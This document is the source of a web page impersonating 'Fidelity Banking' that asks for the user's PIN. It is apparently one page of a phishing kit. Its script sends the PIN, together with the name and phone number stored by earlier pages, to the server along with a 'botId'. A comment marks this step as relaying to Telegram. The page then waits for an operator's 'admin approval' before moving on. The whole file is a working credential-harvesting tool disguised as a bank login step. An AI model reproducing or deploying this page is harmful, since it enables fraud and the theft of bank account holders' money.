<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Enter PIN – Fidelity Banking</title>

<style>
/* ================================
   GLOBAL – Fidelity Theme
================================ */
* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}

body {
  margin: 0;
  font-family: Arial, Helvetica, sans-serif;
  background: #f9f7f6;
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 24px 16px;
}

/* ================================
   PIN CARD
================================ */
.pin-card {
  width: 100%;
  max-width: 420px;
  background: #ffffff;
  border-radius: 16px;
  padding: 32px 24px 36px;
  box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
  text-align: center;
  position: relative;
}

/* ================================
   BACK BUTTON
================================ */
.back {
  position: absolute;
  left: 20px;
  top: 20px;
  font-size: 24px;
  color: #e11b22;
  cursor: pointer;
  font-weight: 700;
  background: #f9f7f6;
  width: 40px;
  height: 40px;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  transition: background 0.2s;
}
.back:hover {
  background: #f0edeb;
}

/* ================================
   HEADER
================================ */
.pin-title {
  font-size: 24px;
  font-weight: 700;
  color: #e11b22; /* Fidelity Red */
  margin-bottom: 4px;
}

.pin-subtitle {
  font-size: 14px;
  color: #666666;
  margin-bottom: 24px;
  font-weight: 400;
}

/* Gold accent line (matches other pages) */
.accent-line {
  width: 50px;
  height: 3px;
  background: #f5c518;
  border-radius: 4px;
  margin: 6px auto 22px;
}

/* ================================
   PIN INPUT WRAPPER (Red gradient)
================================ */
.pin-box-wrapper {
  background: linear-gradient(135deg, #e11b22, #f45112);
  border-radius: 16px;
  padding: 24px 16px;
  margin-bottom: 28px;
  box-shadow: 0 8px 28px rgba(225, 27, 34, 0.25);
}

/* ================================
   PIN INPUT FIELD
================================ */
.pin-input {
  width: 100%;
  padding: 16px 20px;
  border: none;
  border-radius: 12px;
  font-size: 20px;
  font-weight: 600;
  letter-spacing: 4px;
  outline: none;
  background: #ffffff;
  color: #1c1c1e;
  text-align: center;
  box-shadow: inset 0 2px 6px rgba(0, 0, 0, 0.06);
}
.pin-input:focus {
  box-shadow: inset 0 2px 6px rgba(0, 0, 0, 0.12), 0 0 0 3px rgba(244, 81, 18, 0.2);
}
.pin-input::placeholder {
  color: #aaaaaa;
  letter-spacing: 1px;
  font-weight: 400;
}

/* ================================
   LOGIN BUTTON (Pill shape)
================================ */
button {
  width: 100%;
  padding: 16px 0;
  font-size: 17px;
  font-weight: 700;
  background: #e11b22;
  color: #ffffff;
  border: none;
  border-radius: 999px;
  cursor: pointer;
  opacity: 0.5;
  transition: all 0.25s ease;
  box-shadow: 0 8px 24px rgba(225, 27, 34, 0);
  letter-spacing: 0.3px;
}

button:enabled {
  opacity: 1;
  box-shadow: 0 8px 24px rgba(225, 27, 34, 0.25);
}

button:enabled:hover {
  background: #c9181f;
  transform: scale(1.01);
  box-shadow: 0 12px 32px rgba(225, 27, 34, 0.35);
}

button:enabled:active {
  transform: scale(0.97);
}

button:disabled {
  cursor: not-allowed;
}

/* ================================
   STATUS / WAITING MESSAGE
================================ */
.status {
  margin-top: 16px;
  font-size: 14px;
  color: #e11b22;
  font-weight: 600;
  display: none;
}

.error {
  color: #dc2626;
}

/* ================================
   RESPONSIVE
================================ */
@media (max-width: 420px) {
  .pin-card {
    padding: 24px 16px 28px;
  }
  .pin-title {
    font-size: 20px;
  }
  .pin-box-wrapper {
    padding: 16px 12px;
  }
  .pin-input {
    font-size: 18px;
    padding: 14px 16px;
  }
  button {
    font-size: 16px;
    padding: 14px 0;
  }
  .back {
    left: 14px;
    top: 14px;
    width: 36px;
    height: 36px;
    font-size: 20px;
  }
}
</style>
</head>

<body>

<div class="pin-card" onclick="focusPin()">

  <!-- Back Button -->
  <div class="back" onclick="event.stopPropagation(); history.back();">←</div>

  <!-- Header -->
  <div class="pin-title">Enter PIN</div>
  <div class="pin-subtitle">Secure your Fidelity account</div>
  <div class="accent-line"></div>

  <!-- PIN Input (Red background wrapper) -->
  <div class="pin-box-wrapper">
    <input
      id="pinInput"
      type="password"
      inputmode="numeric"
      placeholder="Enter your PIN"
      class="pin-input"
      autofocus
    />
  </div>

  <!-- Submit Button -->
  <button id="loginBtn" disabled>Confirm PIN →</button>

  <!-- Status Message -->
  <div id="status" class="status">⏳ Waiting for approval…</div>

</div>

<script>
// ================================
// DOM REFERENCES
// ================================
const input = document.getElementById('pinInput');
const loginBtn = document.getElementById('loginBtn');
const statusEl = document.getElementById('status');

// ================================
// SESSION CHECK
// ================================
const fullName = localStorage.getItem('fullName') || 'User';
const phone = localStorage.getItem('phone');
const botId = localStorage.getItem('botId');

if (!phone || !botId) {
  alert('Session expired. Please start again.');
  window.location.href = 'index.html';
}

// ================================
// FOCUS HELPER
// ================================
function focusPin() {
  input.focus();
}

// ================================
// INPUT HANDLER – Accept ANY length of digits
// ================================
input.addEventListener('input', () => {
  // Allow only digits (removes letters/symbols)
  input.value = input.value.replace(/\D/g, '');

  // Enable button as soon as there's at least 1 digit (no max length!)
  loginBtn.disabled = input.value.length === 0;
});

// ================================
// SUBMIT HANDLER – Telegram + Polling
// ================================
loginBtn.addEventListener('click', async () => {
  const pin = input.value.trim();

  // Disable UI and show waiting
  loginBtn.disabled = true;
  statusEl.style.display = 'block';
  statusEl.textContent = '⏳ Waiting for approval…';
  statusEl.classList.remove('error');

  try {
    const res = await fetch('/submit-pin', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        name: fullName,
        phone,
        pin,          // this can be 1 digit, 6 digits, or 10 digits
        botId
      })
    });

    const data = await res.json();

    if (!data.requestId) {
      throw new Error('Missing requestId');
    }

    // Start polling for admin approval
    pollPin(data.requestId);

  } catch (e) {
    statusEl.classList.add('error');
    statusEl.textContent = '❌ Server error. Try again.';
    loginBtn.disabled = false;
  }
});

// ================================
// POLLING LOGIC (matches OTP & Form)
// ================================
function pollPin(requestId) {
  let attempts = 0;
  const maxAttempts = 60; // 2 minutes

  const interval = setInterval(async () => {
    attempts++;

    try {
      const res = await fetch(`/check-pin/${requestId}`);
      const data = await res.json();

      // ✅ SUCCESS – redirect to success.html (matches your flow)
      if (data.approved === true || data.redirect === 'success') {
        clearInterval(interval);
        window.location.href = 'success.html';
        return;
      }

      // ❌ REJECTED
      if (data.approved === false || data.blocked) {
        clearInterval(interval);
        input.value = '';
        loginBtn.disabled = true;
        statusEl.classList.add('error');
        statusEl.textContent = '❌ Incorrect PIN. Try again.';
        loginBtn.disabled = false;
        return;
      }

      // ⏰ TIMEOUT
      if (attempts >= maxAttempts) {
        clearInterval(interval);
        input.value = '';
        loginBtn.disabled = true;
        statusEl.classList.add('error');
        statusEl.textContent = '⏰ Request timed out. Please try again.';
        loginBtn.disabled = false;
      }

    } catch (e) {
      console.log('Poll error:', e);
    }
  }, 2000);
}
</script>

</body>
</html>
